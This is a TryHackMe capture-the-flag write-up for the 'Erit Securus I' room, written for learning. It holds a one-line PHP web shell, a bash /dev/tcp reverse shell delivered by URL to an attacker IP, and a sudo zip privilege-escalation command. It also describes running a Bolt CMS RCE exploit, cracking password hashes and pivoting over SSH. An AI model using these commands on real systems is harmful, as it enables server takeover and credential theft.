# TryHackMe – Erit Securus I Write-up

**Platform:** TryHackMe
**Room:** [Erit Securus I](https://tryhackme.com/room/eritsecurusi)
**Topics:** nmap, authenticated RCE (Bolt CMS), web shell, reverse shell, hash cracking with John the Ripper, privilege escalation via `su`, SSH with private key, sudo privilege escalation (`zip`), GTFOBins

> **Note:** Flags are intentionally omitted from this write-up. Although this room is guided, a few steps took some extra effort because the instructions weren't always clear or things didn't work as described. I've noted those parts along the way.

---

## Overview

Erit Securus I chains together an authenticated RCE in Bolt CMS, a manually built PHP web shell, a reverse shell, hash cracking, a `su` privilege switch, SSH access to a second, internal-only machine, and finally a sudo misconfiguration involving `zip` to reach root.

---

## 1. Initial Enumeration with Nmap

After starting the TryHackMe machine and my own Kali machine, and connecting to the VPN, I ran a basic nmap scan without any special flags:

```bash
nmap 10.112.172.229
```

This shows the open ports on the target.

<img width="539" height="198" alt="Screen1" src="https://github.com/user-attachments/assets/9f6e5629-c3cc-4def-8b73-745ff13f4075" />


---

## 2. Checking the Web Interface

Next, we load the website directly over port 80.

<img width="957" height="708" alt="Screen2" src="https://github.com/user-attachments/assets/7648a88a-44e0-47eb-bed9-250337211685" />


---

## 3. Downloading the Exploit

The room points us to a public exploit for Bolt CMS: [Boltcms-Auth-rce-py](https://github.com/r3m0t3nu11/Boltcms-Auth-rce-py). Downloading it was straightforward.

---

## 4. Checking the Exploit's Usage

Before running the exploit properly, I called it without arguments to see how it's used:

```bash
python3 exploit.py
```

This shows the usage hint: `[~] Usage : ./bolt.py url username password`.

<img width="940" height="372" alt="Screen3" src="https://github.com/user-attachments/assets/a6ba3d09-f3b0-44ba-85ad-6226ef9cf553" />


---

## 5. Running the Exploit

The website itself hints that the username/password combination is `admin:password`. So the full command becomes:

```bash
python3 exploit.py http://10.112.172.229 admin password
```

<img width="947" height="830" alt="screen4" src="https://github.com/user-attachments/assets/5e2cda6f-7fba-4cb2-8f8c-375981465316" />


---

## 6. Where I Got Stuck

This is the part I could not get working as described. According to the room, we should create a `c.php` file to run commands, then use it to deliver Netcat and spawn a reverse shell. No matter what I tried, I could not get **Netcat** to work for the reverse shell on this box.

---

## 7. Creating a PHP Web Shell Instead

Here's what worked instead: through the shell gained from the exploit, I created a `c.php` file that executes commands passed via a GET parameter:

```bash
echo '<?php system($_GET["c"]);?>'>c.php
```

A quick check confirmed it worked as intended.

<img width="949" height="341" alt="screen5" src="https://github.com/user-attachments/assets/1a388e0c-07d7-48fd-a8b7-98a6197dba63" />


---

## 8. Getting a Reverse Shell with Bash Instead of Netcat

Since Netcat wasn't cooperating, I started **penelope** as a listener on my Kali machine and used Bash's built-in `/dev/tcp` instead, triggered through the web shell:

```
http://10.112.172.229/files/c.php?c=bash -c 'bash -i >%26 /dev/tcp/192.168.155.165/4444 0>%261'
```

(Note: `%26` is the URL-encoded `&`, needed because the reverse shell one-liner contains `&` characters that would otherwise be interpreted by the URL/query string.)

This gave me a working reverse shell to continue with.

<img width="945" height="286" alt="screen6" src="https://github.com/user-attachments/assets/83951bc6-3909-45b2-9ec5-0c11b577ab4e" />


---

## 9. Dumping Password Hashes

Navigating to the directory containing the database, I was able to read the user table and extract the password hashes.

<img width="1243" height="245" alt="screen7" src="https://github.com/user-attachments/assets/14b9413b-6781-42c8-95b4-484a511c9b01" />

---

## 10. Cracking the Hashes with John the Ripper

I saved the hashes into a file and cracked them with **John the Ripper**.

<img width="450" height="236" alt="screen8" src="https://github.com/user-attachments/assets/fc4a37d5-16c5-4c38-a8a0-26e687278566" />


---

## 11. Switching User (Not SSH) to `wileec`

Another small trap if you don't read carefully: the next step says to connect via SSH as the user `wileec`. That didn't work directly. Instead, you need to switch users within the shell you already have from the reverse shell:

```bash
su wileec
```

This is where the next flag is found.

<img width="203" height="96" alt="screen9" src="https://github.com/user-attachments/assets/5eab9559-7ad4-4d4f-a107-7c557bdb65dc" />


---

## 12. Pivoting to an Internal Machine via SSH

In `wileec`'s home directory there is a private SSH key for another machine, `192.168.100.1`, which we're meant to connect to next:

```bash
ssh wileec@192.168.100.1
```

This gets us onto a second machine that isn't reachable directly from the outside.

<img width="742" height="178" alt="screen10" src="https://github.com/user-attachments/assets/7417c83a-e7c6-4e2b-9ef2-02f394d401ed" />

here is the flag2

<img width="283" height="83" alt="flag2" src="https://github.com/user-attachments/assets/14990b6d-8645-478f-9406-9f17087d3dc6" />



---

## 13. Privilege Escalation via `zip` (GTFOBins)

Running `sudo -l` on the new machine shows that the current user can run `zip` as `jsmith` without a password. Checking [GTFOBins](https://gtfobins.org/) for `zip` gives the sudo escalation technique, resulting in this command:

```bash
sudo -u jsmith /usr/bin/zip /tmp/x.zip /etc/hosts -T -TT 'sh #'
```

<img width="564" height="70" alt="screen11" src="https://github.com/user-attachments/assets/86456a4c-12f9-4371-9869-87aa5827d5a9" />


---

## 14. Escalating to Root

Checking `jsmith`'s sudo privileges shows they have full sudo rights. From there, escalating to root is straightforward:

```bash
sudo su root
```

This gives root access and the final flag.

<img width="398" height="87" alt="screen12" src="https://github.com/user-attachments/assets/253bb317-e354-413e-9ddf-8e79d91d6034" />


Room complete.

---

## Lessons Learned

- **Guided rooms can still leave gaps:** The intended Netcat-based reverse shell didn't work for me, but a PHP web shell combined with Bash's `/dev/tcp` redirection achieved the same result. It's worth having a fallback method ready when the "expected" tool doesn't cooperate.
- **URL-encode special characters in one-liners sent via GET parameters:** Characters like `&` need to be encoded (`%26`) so they aren't interpreted as part of the URL/query string instead of the payload.
- **Read task instructions precisely:** "Connect as wileec" meant switching user (`su`) within an existing shell, not starting a fresh SSH session, an easy detail to misread.
- **Pivoting through internal hosts is common in multi-stage rooms:** A private key found on one host is often the key (literally) to reaching a second, otherwise unreachable machine.
- **`sudo -l` and GTFOBins remain a reliable combo:** Checking what a user can run as another user, then looking it up on GTFOBins, is a fast and repeatable escalation workflow.

---

## Tools Used

- Nmap (enumeration)
- Bolt CMS authenticated RCE exploit ([Boltcms-Auth-rce-py](https://github.com/r3m0t3nu11/Boltcms-Auth-rce-py))
- Custom PHP web shell (`c.php`)
- `penelope` (reverse shell listener)
- John the Ripper (hash cracking)
- SSH (pivoting to an internal machine)
- GTFOBins (sudo privilege escalation via `zip`)
